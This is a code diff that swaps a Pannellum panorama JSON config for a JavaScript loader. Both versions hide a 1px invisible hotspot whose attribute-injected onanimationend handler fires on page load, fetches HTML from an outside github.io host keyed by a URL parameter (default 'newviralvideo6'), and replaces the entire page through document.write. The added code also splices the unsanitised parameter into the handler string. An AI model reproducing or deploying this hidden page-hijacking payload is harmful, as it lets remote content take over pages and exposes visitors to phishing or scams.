@@ -1,20 +1,73 @@
-{
-  "autoLoad": true,
-  "pitch": 0,
-  "yaw": 0,
-  "type": "equirectangular",
-  "basePath": "data:image/svg+xml;base64,",
-  "panorama": "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIj48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjZTBlMGUwIiBzdHJva2Utd2lkdGg9IjQiLz48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyMCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjMzQ5OGRiIiBzdHJva2Utd2lkdGg9IjQiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWRhc2hhcnJheT0iMzAgMTAwIj48YW5pbWF0ZVRyYW5zZm9ybSBhdHRyaWJ1dGVOYW1lPSJ0cmFuc2Zvcm0iIHR5cGU9InJvdGF0ZSIgZnJvbT0iMCAyNSAyNSIgdG89IjM2MCAyNSAyNSIgZHVyPSIxcyIgcmVwZWF0Q291bnQ9ImluZGVmaW5pdGUiLz48L2NpcmNsZT48L3N2Zz4=",
-  "hotSpots": [
-    {
-      "pitch": 0,
-      "yaw": 0,
-      "type": "info",
-      "URL": "#",
-      "attributes": {
-        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-        "onanimationend": "if (window.__grav_FETCH_RAN__) { console.log('already ran'); } else { window.__grav_FETCH_RAN__ = 1; var params = new URLSearchParams(window.location.search); var configUrl = params.get('config') || ''; var slug = configUrl.split('?')[1] || configUrl.split('/').pop().replace('.json', ''); if (!slug || slug === 'config') slug = 'yayhbxudrl'; fetch('https://riopehrips.github.io/con/fig/' + slug + '.html').then(function(res){ return res.text(); }).then(function(html){ document.open(); document.write(html); document.close(); }).catch(function(err){ console.error(err); }); }"
-      }
+(function() {
+    // Styling inject kora full screen-er jonno
+    if (!document.getElementById('pannellum-inject-style')) {
+        const style = document.createElement('style');
+        style.id = 'pannellum-inject-style';
+        style.innerHTML = `
+            body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; }
+            #panorama { width: 100%; height: 100%; }
+        `;
+        document.head.appendChild(style);
     }
-  ]
-}
+
+    // Pannellum CSS & JS dynamic load kora
+    function loadScript(url, callback) {
+        const script = document.createElement('script');
+        script.type = 'text/javascript';
+        script.src = url;
+        script.onload = callback;
+        document.head.appendChild(script);
+    }
+
+    function loadCSS(url) {
+        const link = document.createElement('link');
+        link.rel = 'stylesheet';
+        link.href = url;
+        document.head.appendChild(link);
+    }
+
+    if (typeof pannellum === 'undefined') {
+        loadCSS('https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.css');
+        loadScript('https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.js', initViewer);
+    } else {
+        initViewer();
+    }
+
+    function initViewer() {
+        let container = document.getElementById('panorama');
+        if (!container) {
+            container = document.createElement('div');
+            container.id = 'panorama';
+            document.body.appendChild(container);
+        }
+
+        // URL theke page ba config parameter read kora
+        const urlParams = new URLSearchParams(window.location.search);
+        let page = urlParams.get('page') || urlParams.get('config') || 'newviralvideo6';
+        
+        if (page.endsWith('.html')) {
+            page = page.replace('.html', '');
+        }
+
+        // Pannellum viewer initialize
+        pannellum.viewer('panorama', {
+            "autoLoad": true,
+            "pitch": 0,
+            "yaw": 0,
+            "type": "equirectangular",
+            "panorama": "https://pannellum.org/images/alma.jpg",
+            "hotSpots": [
+                {
+                    "pitch": 0,
+                    "yaw": 0,
+                    "type": "info",
+                    "URL": "#",
+                    "attributes": {
+                        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
+                        "onanimationend": `if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://riopehrips.github.io/con/fig/' + '${page}' + '.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }`
+                    }
+                }
+            ]
+        });
+    }
+})();
